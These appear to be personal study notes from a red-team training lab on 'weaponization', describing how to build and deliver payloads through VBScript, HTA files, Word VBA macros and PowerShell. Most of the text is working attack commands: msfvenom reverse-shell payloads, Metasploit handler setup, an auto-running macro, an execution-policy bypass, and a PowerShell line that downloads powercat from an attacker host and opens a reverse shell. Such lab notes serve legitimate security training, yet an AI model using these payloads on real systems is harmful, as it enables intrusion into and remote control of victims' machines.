
Weaponization is the second stage of the Cyber Kill Chain model. In this stage, the attacker generates and develops their own malicious code using deliverable payloads such as word documents, PDFs, etc.

 red team toolkits -  https://github.com/infosecn1nja/Red-Teaming-Toolkit#Payload%20Development

#### Windows Scripting Host (WSH)

 VBScript engine on a Windows operating system runs and executes applications with the same level of access and permission as a regular user; therefore, it is useful for the red teamers.

![[Pasted image 20251104113012.png]]
![[Pasted image 20251104112901.png]]

c:\Windows\System32>wscript c:\Users\thm\Desktop\payload.vbs
c:\Windows\System32>cscript.exe c:\Users\thm\Desktop\payload.vbs

 
Another trick. If the VBS files are blacklisted, then we can rename the file to .txt file and run it using wscript as follows,

c:\Windows\System32>wscript /e:VBScript c:\Users\thm\Desktop\payload.txt


#### An HTML Application (HTA)

payload.hta:
![[Pasted image 20251104130711.png]]
we will  serve it from a web server with

python3 -m http.server 8090 

and visit the link from the victim maching
http://10.8.232.37:8090/payload.hta


##### hta with msfvenom

	msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.248.151 LPORT=443 -f hta-psh -o thm.hta

python3 -m http.server 4444

set a listener:

nc -lvnp 443

##### hta with mfsconsole
msf6 > use exploit/windows/misc/hta_server
set payload windows/meterpreter/reverse_tcp
set lhost,lport to the attacker values (and set srvhost to attacker ip)

msf6 exploit(windows/misc/hta_server) > exploit
On the victim machine, once we visit the malicious HTA file that was provided as a URL by Metasploit

#### Visual Basic for Application (VBA)
open a blacnk word document:
selecting view → macros. The Macros window shows to create our own macro within the document.
![[Pasted image 20251104140723.png]]
select create
we can write VBA code.
```javascript
Sub THM()
	Dim payload As String
	payload = "calc.exe"
	CreateObject("Wscript.Shell").Run payload,0
End THM
```

Finally, run the macro by F5 or Run → Run Sub/UserForm.

 to be run once the document opens, we do 
 ```javascript
Sub Document_Open()
  THM
End Sub

Sub AutoOpen()
  THM
End Sub

Sub THM()
   MsgBox ("Welcome to Weaponization Room!")
End Sub
```
we need to save it in Macro-Enabled format such as .doc and docm.


press the icon under "edit"
![[Pasted image 20251104142748.png]]

than save as 

 save as type → Word 97-2003 Document
![[Pasted image 20251104141547.png]]

##### vba with mfsconsole
msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.50.159.15 LPORT=443 -f vba

on attacker:
use exploit/multi/handler
set payload windows/meterpreter/reverse_tcp
set LHOST,LPORT
![[Pasted image 20251104144136.png]]


#### PowerShell (PSH)
![[Pasted image 20251104145208.png]]PowerShell's execution policy is a security option to protect the system from running malicious scripts.
![[Pasted image 20251104145245.png]]


Set-ExecutionPolicy -Scope CurrentUser RemoteSigned
![[Pasted image 20251104145254.png]]

##### Bypass Execution Policy
C:\Users\thm\Desktop>powershell -ex bypass -File thm.ps1

##### reverse shell using powercat

on attacker:

user@machine$ git clone https://github.com/besimorhino/powercat.git
cd powercat
python3 -m http.server 8080

nc -lvp 1337

on victim:
```shell-session
C:\Users\thm\Desktop> powershell -c "IEX(New-Object System.Net.WebClient).DownloadString('http://ATTACKBOX_IP:8080/powercat.ps1');powercat -c ATTACKBOX_IP -p 1337 -e cmd"
```
Now that we have executed the command above, the victim machine downloads the powercat.ps1  payload from our web server (on the AttackBox) and then executes it locally on the target using cmd.exe